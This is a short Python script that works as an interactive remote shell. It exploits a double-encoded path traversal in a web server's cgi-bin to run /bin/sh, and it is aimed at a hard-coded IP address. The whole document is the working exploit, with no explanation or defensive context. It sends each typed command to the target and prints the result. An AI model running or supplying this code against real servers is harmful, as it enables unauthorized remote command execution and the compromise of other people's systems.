import urllib, requests

while True:
    data = ("echo;" + input('>')).encode("ascii")
    payload = 'http://130.193.45.27/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
    headers = {"User-Agent": "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0'"}

    request = urllib.request.Request(payload, data=data, headers=headers)
    response = urllib.request.urlopen(request)
    print(response.read().decode("utf-8"))